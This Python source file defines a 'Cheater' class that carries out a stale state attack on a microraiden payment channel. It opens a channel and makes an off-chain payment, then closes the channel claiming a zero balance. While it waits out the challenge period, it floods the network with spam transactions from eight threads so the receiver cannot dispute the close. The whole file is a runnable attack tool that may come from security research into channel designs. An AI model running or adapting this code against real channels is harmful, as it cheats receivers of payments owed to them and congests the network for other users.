#!/usr/bin/python

import logging
import datetime

from microraiden import Client
from microraiden.stale_state_attack.spamming import SpamManager
from microraiden.stale_state_attack.utils import (
    send_payment,
    create_close_channel_transaction,
    create_settle_channel_transaction,
    wait_for_open,
    wait_for_close,
    wait_for_settle,
)
from microraiden.stale_state_attack.config import (
    PRIVATE_KEY,
    CHANNEL_MANAGER_ADDRESS,
    CONGESTION_LEVEL,
    RECEIVER_ADDRESS,
    MIN_QUEUED_TXS,
)


class Cheater():
    '''
    The Cheater class can be used to perform a state stale attack on a microraiden channel.
    '''

    def __init__(
        self,
        web3,
        private_key: str=PRIVATE_KEY,
        channel_manager_address: str=CHANNEL_MANAGER_ADDRESS,
        congestion_level: int=CONGESTION_LEVEL,
    ):
        self.web3 = web3
        self.private_key = private_key
        self.logger = logging.getLogger('cheater')
        self.channel = None

        # Initialize client
        self.client = Client(private_key=private_key, key_password_path=None,
                             channel_manager_address=channel_manager_address)

        # Initialize spam manager
        self.spam_manager = SpamManager(
            web3=web3,
            private_key=private_key,
            number_threads=8,
            nonce_offset=1,  # for close request
            congestion_level=congestion_level,
            create_settle_transaction=lambda nonce: self.create_settle_transaction(nonce),
        )

    def start(self):
        '''
        Perform a cheat attempt:
        1) Open new channel
        2) Send offchain payment
        3) Close with zero balance
        '''
        # Get an open channel
        self.initialize_channel(receiver=RECEIVER_ADDRESS, value=1)

        # Send an off-chain payment
        self.send_offchain_payment(amount=1)

        # Wait until minimum number of signed spam transactions are in queue
        if (len(self.spam_manager.queued_transactions()) < MIN_QUEUED_TXS):
            self.logger.info(
                'Waiting for full transaction queue ({} transactions)...'.format(MIN_QUEUED_TXS))
            self.spam_manager.wait_for_full_tx_queue()

        # Start stale state attack
        self.state_stale_attack(balance=0)

    def initialize_channel(self, receiver: str=RECEIVER_ADDRESS, value: int=1):
        '''
        Get or open a new channel to the given receiver that can sustain the given transfer value.
        '''
        self.channel = self.client.get_suitable_channel(
            receiver=self.web3.toChecksumAddress(receiver),
            value=value
        )

        # Wait for channel to be open
        try:
            wait_for_open(channel=self.channel, confirmations=2)
            self.logger.info('Active channel: (sender={}, block={})'.format(
                self.channel.sender, self.channel.block))
        except:
            wait_for_open(channel=self.channel, confirmations=2)

    def send_offchain_payment(self, amount: int=1):
        '''
        Send an offchain payment of the given {amount} through the channel.
        '''
        self.channel.create_transfer(amount)
        send_payment(channel=self.channel, amount=amount)

    def state_stale_attack(self, balance: int=0):
        '''
        Performs a stale state attack on the given channel. 
        Assumes that the given channel's balance is > 0. Closes the channel with balance 0 
        and spams the network with transactions from the channel's sender account
        until the channel is settled or the challenge period is over. If the end of the challenge
        period is reached, a settle request is sent.
        '''
        # Create close channel transaction
        close_tx = create_close_channel_transaction(channel=self.channel, balance=balance)

        # Send close channel transaction
        self.logger.info('Sending close transaction...')
        self.web3.eth.sendRawTransaction(close_tx)

        # Start transaction spamming with 8 threads
        self.spam_manager.start()

        # Wait for channel to be closed
        closed_event = wait_for_close(self.channel)
        self.logger.info('Channel closed at block #{}'.format(closed_event['blockNumber']))

        # Get block number when channel can be settled
        _, _, settle_block, _, _ = self.channel.core.channel_manager.call().getChannelInfo(
            self.channel.sender, self.channel.receiver, self.channel.block
        )
        # Update target block for spamming thread
        self.spam_manager.update_target_block(settle_block)

        # Wait for channel to be settled
        settled_event = wait_for_settle(self.channel)
        self.logger.info('Channel settled at block #{}'.format(settled_event['blockNumber']))

        # Stop the spamming
        self.spam_manager.stop()

        # Get the settle transaction
        settle_tx_hash = settled_event['transactionHash']
        settle_tx = self.web3.eth.getTransaction(settle_tx_hash)

        # Extract some interesting information
        close_block = self.web3.eth.getBlock(closed_event['blockNumber'])
        settle_block = self.web3.eth.getBlock(settled_event['blockNumber'])
        elapsed_time = datetime.timedelta(
            seconds=settle_block['timestamp'] - close_block['timestamp'])

        # Determine, if sender or receiver settled the channel
        settled_by = settle_tx['from']
        if (settled_by == self.channel.receiver):
            settled_by = 'Receiver'
        if (settled_by == self.channel.core.address):
            settled_by = 'Sender'

        # Print result
        print()
        print('-----------------------------------------------------------')
        print('Sender \t\t {}'.format(self.channel.core.address))
        print('Receiver \t {}'.format(self.channel.receiver))
        # print('OPENED block \t #{}'.format(channel.block))
        # print('CLOSED block \t #{}'.format(closed_event['blockNumber']))
        # print('SETTLED block \t #{}'.format(settled_event['blockNumber']))
        print()
        print('Settled by \t\t {}'.format(settled_by))
        print('Settle balance \t\t {}'.format(settled_event['args']['_balance']))
        print('Spam transactions \t {}'.format(self.spam_manager.number_sent_transactions()))
        print('Elapsed time \t\t {}'.format(str(elapsed_time)))
        print(
            'CLOSE->SETTLE \t\t {}'.format(settled_event['blockNumber'] - closed_event['blockNumber']))
        print('-----------------------------------------------------------')
        print()

    def create_settle_transaction(self, nonce):
        return create_settle_channel_transaction(self.channel, nonce)
